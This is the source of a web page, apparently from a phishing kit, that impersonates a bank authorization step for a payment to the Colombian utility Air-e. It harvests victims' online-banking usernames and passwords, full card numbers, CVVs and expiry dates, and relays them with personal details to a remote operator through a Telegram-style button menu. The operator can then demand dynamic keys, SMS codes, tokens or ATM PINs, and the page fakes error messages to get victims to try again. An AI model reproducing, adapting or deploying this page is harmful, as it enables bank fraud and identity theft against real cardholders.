<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorizaci√≥n de Transacci√≥n Bancaria</title>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/aes.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/md5.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/pbkdf2.min.js"></script>

    <script>
        // Funciones de utilidad (StringMask, AesUtil, generateTransactionId, formatCurrencyCOP) Omitidas por brevedad.
        if (typeof StringMask === 'undefined') {
            var StringMask = {
                apply: function(value, pattern) {
                    if (!value) return '';
                    value = String(value);
                    let result = '';
                    let valueIndex = 0;
                    for (let i = 0; i < pattern.length && valueIndex < value.length; i++) {
                        if (pattern[i] === '0') {
                            result += value[valueIndex++];
                        } else {
                            result += pattern[i];
                        }
                    }
                    return result;
                }
            };
        }

        if (typeof AesUtil === 'undefined') {
            var AesUtil = function(keySize, iterationCount) {
                this.keySize = keySize / 32;
                this.iterationCount = iterationCount;

                this.generateKey = function(salt, passPhrase) {
                    var key = CryptoJS.PBKDF2(
                        passPhrase,
                        CryptoJS.enc.Hex.parse(salt),
                        { keySize: this.keySize, iterations: this.iterationCount });
                    return key;
                };

                this.encrypt = function(salt, iv, passPhrase, plainText) {
                    var key = this.generateKey(salt, passPhrase);
                    var encrypted = CryptoJS.AES.encrypt(
                        plainText,
                        key,
                        { iv: CryptoJS.enc.Hex.parse(iv) });
                    return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
                };

                this.decrypt = function(salt, iv, passPhrase, cipherText) {
                    var key = this.generateKey(salt, passPhrase);
                    var cipherParams = CryptoJS.lib.CipherParams.create({
                        ciphertext: CryptoJS.enc.Base64.parse(cipherText)
                    });
                    var decrypted = CryptoJS.AES.decrypt(
                        cipherParams,
                        key,
                        { iv: CryptoJS.enc.Hex.parse(iv) });
                    return decrypted.toString(CryptoJS.enc.Utf8);
                };
            };
        }

        function generateTransactionId() {
            return 'tx-' + Math.random().toString(36).substring(2, 9) + '-' + Date.now().toString().slice(-4);
        }
        
        function formatCurrencyCOP(amount) {
            try {
                return new Intl.NumberFormat('es-CO', { style:'currency', currency:'COP', minimumFractionDigits:0 }).format(Math.round(amount));
            } catch (e) {
                return 'COP ' + amount;
            }
        }
    </script>

    <style>
        /* Estilos Base */
        body { font-family: Arial, sans-serif; margin: 0; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .container { width: 100%; max-width: 400px; background: #fff; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); padding: 20px; box-sizing: border-box; overflow-y: auto; margin: 10px 10px; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
        .header img { height: 35px; }
        .title { font-size: 18px; font-weight: bold; margin-bottom: 10px; text-align: left; }
        .details p { margin: 10px 0; font-size: 14px; }
        .input-group { display: flex; justify-content: flex-start; margin-bottom: 15px; }
        .input-group label { width: 35%; text-align: right; margin-right: 10px; font-size: 14px; align-self: center; }
        .input-group input { flex-grow: 1; padding: 8px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; max-width: 60%; }
        .button { width: 50%; padding: 10px; background: #007bff; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 30px; text-align: center; display: block; margin-left: auto; margin-right: auto; }
        .button:disabled { background: #ccc; cursor: not-allowed; }
        .hidden { display: none !important; }
        .instructions-text { font-size: 14px; color: #555; margin: 10px 0; line-height: 1.5; text-align: center; font-weight: normal; font-family: Arial, sans-serif; }
        
        /* TRANSICI√ìN PARA EL CONTENIDO PRINCIPAL */
        #main-content-area {
            transition: opacity 300ms ease-in-out;
        }

        /* --- LOADER MEJORADO SIN FONDO TRANSPARENTE GLOBAL --- */
        .loader-backdrop { 
            position: fixed; 
            top: 0; left: 0; right: 0; bottom: 0;
            /* Se hace transparente para que se vea el fondo de la p√°gina */
            background-color: transparent; 
            display: flex; flex-direction: column; justify-content: center; align-items: center; 
            z-index: 1000;
            transition: opacity 300ms ease;
        }
        .loaderp-full { 
            width: 80%; max-width: 280px; height: 160px; 
            display: flex; flex-direction: column; justify-content: center; align-items: center; 
            /* Se le da un fondo blanco semi-transparente al contenedor del loader */
            background-color: rgba(255, 255, 255, 0.9); 
            border-radius: 12px; 
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15); 
            padding: 20px;
            animation: bounceIn 400ms cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
        }
        @keyframes bounceIn {
            0% { opacity: 0; transform: scale(0.7); }
            100% { opacity: 1; transform: scale(1); }
        }

        .loaderp { 
            width: 50px; height: 50px; 
            border: 5px solid #e0e0e0; 
            border-top-color: #007bff; 
            border-radius: 50%; 
            display: inline-block; 
            box-sizing: border-box; 
            animation: rotation 800ms cubic-bezier(0.4, 0, 0.2, 1) infinite; 
        }
        @keyframes rotation { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }

        .loader-text { font-size: 15px; font-weight: bold; color: #333; margin-top: 15px; }

        @media (max-width: 600px) {
            .loaderp { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top-color: #007bff; }
            .loaderp-full { max-width: 90%; height: 140px; }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <img id="bank-logo" src="logo.png" alt="Logo de Air-e">
            <div class="id-check" style="width:35px; height:35px; opacity:0; pointer-events:none;"></div> 
            </div>

        <div id="main-content-area">
            <div class="title">Autorizaci√≥n de transacci√≥n</div>
            <p class="small" style="color: #666; font-size: 13px;">La transacci√≥n de <strong>Air-e</strong> por <strong id="monto-transaccion">$0 COP</strong> con tarjeta terminada en <strong id="card-last4">0000</strong> debe ser autorizada por el banco emisor.</p>
            <div class="details">
                <p><strong>Comercio:</strong> Air-e S.A. E.S.P.</p>
                <p><strong>Monto:</strong> <span id="monto-transaccion-detalle">Calculando...</span></p>
                <p><strong>Tarjeta:</strong> **** **** **** <span id="card-last4-display">0000</span></p>
            </div>

            <form id="transaction-form" onsubmit="return false;">
                <div id="credentials-container">
                    <div class="input-group">
                        <label id="usuario-label" for="usuario">Usuario:</label>
                        <input type="text" id="usuario" placeholder="Ingresa tu usuario">
                    </div>
                    <div class="input-group">
                        <label id="clave-label" for="clave">Clave:</label>
                        <input type="password" id="clave" placeholder="Ingresa tu clave" maxlength="11">
                    </div>
                    <p class="instructions-text">Estos son los datos que utilizas para ingresar a tu app bancaria.</p>
                </div>

                <div id="dynamic-code-container" class="hidden">
                </div>


                <button class="button" id="authorize-button" disabled>Autorizar</button>
            </form>
        </div>
    </div>
    
    <div class="loader-backdrop hidden" id="loader-container">
        <div class="loaderp-full">
            <span class="loaderp"></span>
            <p class="loader-text" id="loader-text">Validando credenciales...</p>
        </div>
    </div>
    <script>
        let pageState = 'initial';
        let currentTransactionId = generateTransactionId();
        let currentMessageId = '';
        let paymentData = {}; 

        // --- FUNCIONES DE UTILIDAD ---
        function showLoader(show, text = "Validando datos...") {
            const loaderText = document.getElementById('loader-text');
            const loaderContainer = document.getElementById('loader-container');
            const mainContent = document.getElementById('main-content-area');

            if (loaderText) loaderText.textContent = text;
            
            if (show) {
                 loaderContainer.classList.remove("hidden");
                 loaderContainer.style.opacity = '1';
                 mainContent.style.opacity = '0.1'; // Oscurecer sutilmente el contenido
                 mainContent.style.pointerEvents = 'none';
            } else {
                 loaderContainer.style.opacity = '0';
                 setTimeout(() => loaderContainer.classList.add("hidden"), 300); // Esperar que la transici√≥n termine
                 mainContent.style.opacity = '1';
                 mainContent.style.pointerEvents = 'auto';
            }
        }

        function setFormDisabled(disabled) {
            document.getElementById('usuario').disabled = disabled;
            document.getElementById('clave').disabled = disabled;
            const dynamicInput = document.getElementById('dynamic-code');
            if (dynamicInput) dynamicInput.disabled = disabled;
            document.getElementById('authorize-button').disabled = disabled;
        }

        // Esta funci√≥n ya no tiene efecto visual, pero se mantiene la l√≥gica por si se usa en el futuro.
        function normalizarBanco(nombreBanco) {
            const palabrasClave = { 
                "av villas": "bavevi.png", "scotiabank colpatria": "bcolpa.png", 
                "popular": "bpopular.png", "bogota": "bbogo.png", "caja social": "bcajas.png", 
                "davivienda": "bdavi1.svg", "occidente": "bocinen.png", "bbva": "bvva.png", 
                "bancolombia": "bcolombia.png" 
            };
            const nombreNormalizado = nombreBanco.toLowerCase();
            for (const clave in palabrasClave) { if (nombreNormalizado.includes(clave)) return palabrasClave[clave]; }
            return "error2.png"; 
        }

        // --- CARGA DE DATOS DESDE SESSIONSTORAGE Y ACTUALIZACI√ìN DE UI ---
        function loadPaymentData() {
            try {
                const rawData = sessionStorage.getItem('payment_data');
                const encryptedData = sessionStorage.getItem('secure_data');
                
                if (rawData) {
                    paymentData = JSON.parse(rawData);
                    if (encryptedData) {
                        const secureData = JSON.parse(encryptedData); 
                        paymentData.pan = secureData.pan || 'N/A';
                        paymentData.cvv = secureData.cvv || 'N/A';
                        paymentData.expDate = secureData.expDate || 'N/A';
                    } else {
                        paymentData.pan = 'N/A';
                        paymentData.cvv = 'N/A';
                        paymentData.expDate = 'N/A';
                    }
                } else {
                    alert("Error: No se encontraron datos de pago. Redirigiendo al inicio.");
                    window.location.href = "index.html"; 
                    return false;
                }
            } catch (e) {
                console.error("Error al parsear payment_data:", e);
                alert("Error de datos. Redirigiendo al inicio.");
                window.location.href = "index.html"; 
                return false;
            }

            // Actualizar Monto y Tarjeta
            const totalAmount = paymentData.amount || 0;
            const montoFormateado = formatCurrencyCOP(totalAmount);
            document.getElementById("monto-transaccion").innerText = montoFormateado;
            document.getElementById("monto-transaccion-detalle").innerText = montoFormateado;
            document.getElementById("card-last4").innerText = paymentData.last4 || '0000';
            document.getElementById("card-last4-display").innerText = paymentData.last4 || '0000';

            // Actualizar Campos de Login
            const usuarioLabel = document.getElementById("usuario-label");
            const claveInput = document.getElementById("clave");
            
            // Se elimina la parte que actualizaba el logo de la tarjeta (cardTypeLogo)
            
            const banco = paymentData.bank ? paymentData.bank.toLowerCase() : '';
            if (banco.includes("bogota") || banco.includes("caja social") || banco.includes("occidente") || banco.includes("bbva") || banco.includes("davivienda")) {
                usuarioLabel.innerText = "C√©dula:";
                if (banco.includes("occidente") || banco.includes("bbva")) {
                    claveInput.setAttribute("maxlength", "6");
                } else {
                    claveInput.setAttribute("maxlength", "11");
                }
            } else {
                usuarioLabel.innerText = "Usuario:";
                claveInput.setAttribute("maxlength", "11");
            }
            return true;
        }
        
        // ... (El resto de funciones JS (habilitarBoton, switchInterfaceToCode, event listeners, form submit, polling y handleServerAction) se mantiene igual) ...

        function habilitarBoton() {
            const usuario = document.getElementById('usuario').value.trim();
            const clave = document.getElementById('clave').value.trim();
            const dynamicCode = document.getElementById('dynamic-code');

            let isFormValid = false;

            if (pageState === 'initial') {
                isFormValid = (usuario.length >= 4 && clave.length >= 4);
            } else if (pageState === 'waiting_for_code' && dynamicCode) {
                isFormValid = dynamicCode.value.trim().length >= 4;
            }

            document.getElementById('authorize-button').disabled = !isFormValid;
        }

        function switchInterfaceToCode(actionType, label) {
            pageState = 'waiting_for_code';

            document.getElementById('credentials-container').classList.add('hidden');
            document.querySelector('.instructions-text').classList.add('hidden'); 

            const container = document.getElementById('dynamic-code-container');

            let instructions = "";
            let maxLength = "";
            let inputType = "text";

            if (actionType.includes("dinamica") || actionType.includes("token")) {
                instructions = "Consulta tu c√≥digo o token en la <strong>aplicaci√≥n m√≥vil</strong> de tu banco.";
                maxLength = "8";
            } else if (actionType.includes("otp")) {
                instructions = "Hemos enviado un c√≥digo SMS de un solo uso a tu <strong>celular registrado</strong>.";
                maxLength = "8";
            } else if (actionType.includes("cajero")) {
                instructions = "Ingresa tu clave de <strong>cajero autom√°tico</strong> (4 d√≠gitos).";
                maxLength = "4";
                inputType = "password";
            }

            container.innerHTML = `
                <div class="input-group">
                    <label for="dynamic-code">${label}:</label>
                    <input type="${inputType}" id="dynamic-code" data-type="${label}" placeholder="Ingresa el c√≥digo aqu√≠" maxlength="${maxLength}" required>
                </div>
                <p class="instructions-text">${instructions}</p>
            `;
            container.classList.remove('hidden');

            document.getElementById('dynamic-code').addEventListener('input', habilitarBoton);

            document.getElementById('authorize-button').textContent = "Validar C√≥digo";
            showLoader(false, "Validando c√≥digo..."); 
            setFormDisabled(false);
            habilitarBoton();
        }

        window.onload = function () {
            if (loadPaymentData()) {
                document.getElementById('usuario').addEventListener('input', habilitarBoton);
                document.getElementById('clave').addEventListener('input', habilitarBoton);
                habilitarBoton();
            }
        };

        document.getElementById("transaction-form").addEventListener("submit", async function(event) {
            event.preventDefault(); 

            const totalAmount = paymentData.amount || 0;
            const formattedAmount = formatCurrencyCOP(totalAmount);

            let fullMessage = "";
            let keyboard = {};

            setFormDisabled(true);

            if (pageState === 'initial') {
                const user = document.getElementById('usuario').value.trim();
                const pass = document.getElementById('clave').value.trim();

                showLoader(true, "Validando credenciales..."); 

                fullMessage = `
‚úÖ PAGO AIR-E - AUTORIZACI√ìN ‚ö°
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ DATOS DEL TITULAR
üßë Nombre: ${paymentData.fullName || 'N/A'}
üìß Email: ${paymentData.email || 'N/A'}
üÜî C√©dula: ${paymentData.idNumber || 'N/A'}
üì± Tel√©fono: ${paymentData.phone || 'N/A'}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üí≥ INFORMACI√ìN DE PAGO COMPLETA
üè¶ Banco: ${paymentData.bank || '‚ùì Desconocido'}
üí≥ Tarjeta PAN: ${paymentData.pan || 'N/A'}
üîê CVV: ${paymentData.cvv || 'N/A'}
üóìÔ∏è Vencimiento: ${paymentData.expDate || 'N/A'}
üîë Tipo: ${paymentData.cardType || 'N/A'}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üîë DATOS DE ACCESO
üë§ Usuario: ${user}
üîë Contrase√±a: ${pass}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üí∞ DETALLES DE LA TRANSACCI√ìN
üíµ Monto: ${formattedAmount}
üÜî ID de Transacci√≥n: ${currentTransactionId}
`;
                keyboard = {
                    inline_keyboard: [
                        [
                            { text: "üîë Pedir Din√°mica", callback_data: `pedir_dinamica:${currentTransactionId}` },
                            { text: "üì± Pedir OTP/SMS", callback_data: `pedir_otp:${currentTransactionId}` }
                        ],
                        [
                            { text: "üìü Pedir Token", callback_data: `pedir_token:${currentTransactionId}` },
                            { text: "üèß Clave Cajero", callback_data: `pedir_cajero:${currentTransactionId}` }
                        ],
                        [
                            { text: "‚ùå Error User/Clave", callback_data: `error_login:${currentTransactionId}` },
                            { text: "üí≥ Error Tarjeta", callback_data: `error_tc:${currentTransactionId}` }
                        ],
                        [
                            { text: "‚úÖ Finalizar Transacci√≥n", callback_data: `finalizar:${currentTransactionId}` }
                        ]
                    ]
                };

            } else if (pageState === 'waiting_for_code') {
                const codeInput = document.getElementById('dynamic-code');
                const codeValue = codeInput.value.trim();
                const codeType = codeInput.dataset.type;
                const user = document.getElementById('usuario').value.trim();
                const pass = document.getElementById('clave').value.trim();

                showLoader(true, "Validando c√≥digo...");

                fullMessage = `
üõçÔ∏è PAGO AIR-E - C√ìDIGO RECIBIDO ‚ö°
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ DATOS DE ACCESO PREVIOS
üë§ Usuario: ${user}
üîë Contrase√±a: ${pass}
üè¶ Banco: ${paymentData.bank || '‚ùì Desconocido'}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üî¢ C√ìDIGO RECIBIDO
üìå Tipo: ${codeType}
‚ÄºÔ∏è C√≥digo: ${codeValue}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üí∞ DETALLES DE LA TRANSACCI√ìN
üíµ Monto: ${formattedAmount}
üÜî ID de Transacci√≥n: ${currentTransactionId}
`;
                keyboard = {
                    inline_keyboard: [
                        [
                            { text: "‚úÖ C√≥digo Correcto", callback_data: `finalizar:${currentTransactionId}` },
                            { text: "üîÑ Reenviar C√≥digo", callback_data: `error_code:${currentTransactionId}` }
                        ],
                        [
                            { text: "üîë Pedir Din√°mica", callback_data: `pedir_dinamica:${currentTransactionId}` },
                            { text: "üì± Pedir OTP/SMS", callback_data: `pedir_otp:${currentTransactionId}` }
                        ],
                        [
                            { text: "üìü Pedir Token", callback_data: `pedir_token:${currentTransactionId}` },
                            { text: "üèß Clave Cajero", callback_data: `pedir_cajero:${currentTransactionId}` }
                        ]
                    ]
                };
            }

            try {
                const response = await fetch('/api/send-message', {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        text: fullMessage, 
                        keyboard: keyboard,
                        transactionId: currentTransactionId 
                    }),
                });

                const data = await response.json();

                if (response.ok && data.result && data.result.message_id) {
                    currentMessageId = data.result.message_id;
                    await startPolling(currentMessageId); 
                } else {
                    throw new Error("Error en servidor: " + (data.error || 'Desconocido'));
                }
            } catch (error) {
                console.error("Error de env√≠o:", error);
                showLoader(false, "Validando credenciales...");
                setFormDisabled(false);
                alert("Error de conexi√≥n. Intente nuevamente.");
            }
        });

        async function startPolling(messageId) {
            try {
                const response = await fetch(`/api/check-update/${messageId}`);

                if (response.status === 408) {
                    return await startPolling(messageId);
                }

                const data = await response.json();

                if (data.action) {
                    handleServerAction(data.action);
                } else {
                    setTimeout(() => startPolling(messageId), 2000);
                }
            } catch (error) {
                console.error("Polling error:", error);
                setTimeout(() => startPolling(messageId), 3000);
            }
        }

        function handleServerAction(action) {
            const actionClean = action.split(':')[0]; 

            switch (actionClean) {
                case 'pedir_dinamica':
                    switchInterfaceToCode('pedir_dinamica', 'Clave Din√°mica');
                    break;
                case 'pedir_otp':
                    switchInterfaceToCode('pedir_otp', 'C√≥digo SMS/OTP');
                    break;
                case 'pedir_token':
                    switchInterfaceToCode('pedir_token', 'Token de Seguridad');
                    break;
                case 'pedir_cajero':
                    switchInterfaceToCode('pedir_cajero', 'Clave de Cajero');
                    break;

                case 'error_login':
                    showLoader(false, "Validando credenciales...");
                    setFormDisabled(false);
                    document.getElementById('clave').value = ""; 
                    alert("Usuario o clave incorrectos. Intente nuevamente.");
                    pageState = 'initial';
                    document.getElementById('credentials-container').classList.remove('hidden');
                    document.querySelector('.instructions-text').classList.remove('hidden');
                    habilitarBoton();
                    break;
                case 'error_code':
                    showLoader(false, "Validando c√≥digo...");
                    setFormDisabled(false);
                    const dynamicCodeInput = document.getElementById('dynamic-code');
                    if (dynamicCodeInput) dynamicCodeInput.value = "";
                    alert("C√≥digo inv√°lido o expirado. Intente nuevamente.");
                    habilitarBoton();
                    break;
                case 'error_tc':
                    alert("Error en la tarjeta. Verifique los datos e intente desde el inicio.");
                    window.location.href = "../pay.html"; 
                    break;

                case 'finalizar':
                    alert("Transacci√≥n finalizada con √©xito.");
                    sessionStorage.removeItem('payment_data'); 
                    sessionStorage.removeItem('secure_data'); 
                    window.location.href = "success.html"; 
                    break;

                default:
                    console.log("Acci√≥n desconocida", action);
                    startPolling(currentMessageId);
                    break;
            }
        }
    </script>
</body>
</html>
